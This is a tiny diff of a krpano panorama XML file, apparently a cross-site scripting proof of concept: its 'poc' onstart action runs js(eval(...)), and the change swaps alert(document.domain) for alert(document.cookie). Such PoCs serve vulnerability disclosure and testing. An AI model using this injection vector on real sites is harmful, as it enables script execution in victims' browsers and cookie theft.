@@ -1,5 +1,5 @@
 <krpano version="1.19" onstart="poc();">
         <action name="poc">
-                js(eval('alert(document.domain)'));
+                js(eval('alert(document.cookie)'));
         </action>
 </krpano>
